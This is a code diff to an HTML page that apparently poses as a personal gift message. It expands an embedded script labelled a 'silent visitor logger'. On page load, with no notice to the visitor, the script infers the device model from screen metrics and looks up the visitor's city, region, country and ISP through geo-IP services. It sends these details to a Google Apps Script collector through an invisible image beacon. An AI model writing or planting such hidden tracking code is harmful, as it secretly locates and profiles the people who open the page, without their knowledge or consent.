@@ -433,30 +433,73 @@ Here is a little gift from my side. Click the "Yes" button below to see more. An
 </audio>
 
 <script>
-/* ===================== SILENT VISITOR LOGGER ===================== */
+/* ===================== ADVANCED SILENT VISITOR LOGGER ===================== */
 window.addEventListener("DOMContentLoaded", async () => {
-  const scriptURL = "https://script.google.com/macros/s/AKfycbyxIDXjlXO3p8EYq22HRudzob0oNBC8-juMeIjVHJOW6uNjbZf335H7BGpM1WGKOgwHuA/exec";
-  const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+  // PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE:
+  const scriptURL = "YOUR_GOOGLE_SCRIPT_WEB_APP_URL";
+
+  // Exact timestamp down to the second (IST)
+  const now = new Date().toLocaleString("en-IN", { 
+    timeZone: "Asia/Kolkata",
+    hour12: true,
+    year: "numeric",
+    month: "2-digit",
+    day: "2-digit",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit"
+  });
+
   const ua = navigator.userAgent;
+  const w = window.screen.width;
+  const h = window.screen.height;
+  const ratio = window.devicePixelRatio || 1;
 
-  // Detect Device
+  // Specific Device & iPhone Model Detection
   let device = "Desktop / PC";
-  if (/iPhone/i.test(ua)) device = "Apple iPhone";
-  else if (/iPad/i.test(ua)) device = "Apple iPad";
-  else if (/Android/i.test(ua)) device = "Android Device";
-  else if (/Macintosh|Mac OS X/i.test(ua)) device = "Mac Desktop/Laptop";
-  else if (/Windows NT/i.test(ua)) device = "Windows PC";
+  if (/iPhone/i.test(ua)) {
+    if ((w === 414 && h === 896 && ratio === 2) || (w === 896 && h === 414 && ratio === 2)) {
+      device = "Apple iPhone 11 / XR";
+    } else if ((w === 414 && h === 896 && ratio === 3) || (w === 896 && h === 414 && ratio === 3)) {
+      device = "Apple iPhone 11 Pro Max / XS Max";
+    } else if ((w === 375 && h === 812 && ratio === 3) || (w === 812 && h === 375 && ratio === 3)) {
+      device = "Apple iPhone 11 Pro / X / XS / 12 Mini / 13 Mini";
+    } else if ((w === 390 && h === 844) || (w === 844 && h === 390)) {
+      device = "Apple iPhone 12 / 12 Pro / 13 / 13 Pro / 14";
+    } else if ((w === 393 && h === 852) || (w === 852 && h === 393)) {
+      device = "Apple iPhone 14 Pro / 15 / 15 Pro / 16";
+    } else if ((w === 428 && h === 926) || (w === 926 && h === 428)) {
+      device = "Apple iPhone 12 Pro Max / 13 Pro Max / 14 Plus";
+    } else if ((w === 430 && h === 932) || (w === 932 && h === 430)) {
+      device = "Apple iPhone 14 Pro Max / 15 Plus / 15 Pro Max / 16 Plus";
+    } else if ((w === 440 && h === 956) || (w === 956 && h === 440)) {
+      device = "Apple iPhone 16 Pro Max";
+    } else if ((w === 375 && h === 667) || (w === 667 && h === 375)) {
+      device = "Apple iPhone SE (2nd/3rd Gen) / iPhone 8";
+    } else {
+      device = `Apple iPhone (${w}x${h} @${ratio}x)`;
+    }
+  } else if (/iPad/i.test(ua)) {
+    device = "Apple iPad";
+  } else if (/Android/i.test(ua)) {
+    device = "Android Device";
+  } else if (/Macintosh|Mac OS X/i.test(ua)) {
+    device = "Mac Desktop/Laptop";
+  } else if (/Windows NT/i.test(ua)) {
+    device = "Windows PC";
+  }
 
+  // Silent Geo-IP & Network Fetch
   let locationInfo = "Location Unavailable";
-
-  // Fetch Location Silently
   try {
     const res = await fetch("https://ipapi.co/json/");
     if (res.ok) {
       const loc = await res.json();
-      if (loc.city || loc.region) {
-        locationInfo = `${loc.city || ""}, ${loc.region || ""}, ${loc.country_name || ""} (${loc.org || "Network"})`.replace(/^,\s*/, "");
-      }
+      const city = loc.city || "";
+      const region = loc.region || "";
+      const country = loc.country_name || "";
+      const isp = loc.org || loc.asn || "Network";
+      locationInfo = `${city}, ${region}, ${country} [ISP: ${isp}]`.replace(/^,\s*/, "");
     }
   } catch (e) {}
 
@@ -466,16 +509,19 @@ window.addEventListener("DOMContentLoaded", async () => {
       if (res2.ok) {
         const loc2 = await res2.json();
         if (loc2.success) {
-          locationInfo = `${loc2.city || ""}, ${loc2.region || ""}, ${loc2.country || ""} (${loc2.connection?.isp || "Network"})`.replace(/^,\s*/, "");
+          const city = loc2.city || "";
+          const region = loc2.region || "";
+          const country = loc2.country || "";
+          const isp = loc2.connection?.isp || loc2.connection?.org || "Network";
+          locationInfo = `${city}, ${region}, ${country} [ISP: ${isp}]`.replace(/^,\s*/, "");
         }
       }
     } catch (err) {}
   }
 
-  // Send via URL parameters (Guaranteed to pass all data)
-  const fullURL = `${scriptURL}?timestamp=${encodeURIComponent(now)}&location=${encodeURIComponent(locationInfo)}&device=${encodeURIComponent(device)}&screenResolution=${encodeURIComponent(window.screen.width + "x" + window.screen.height)}&userAgent=${encodeURIComponent(ua)}`;
+  // Dispatch ping to Google Sheet via GET query parameters
+  const fullURL = `${scriptURL}?timestamp=${encodeURIComponent(now)}&location=${encodeURIComponent(locationInfo)}&device=${encodeURIComponent(device)}&screenResolution=${encodeURIComponent(w + "x" + h + " (DPR: " + ratio + ")")}&userAgent=${encodeURIComponent(ua)}`;
 
-  // Invisible image ping
   const beacon = new Image();
   beacon.src = fullURL;
 });
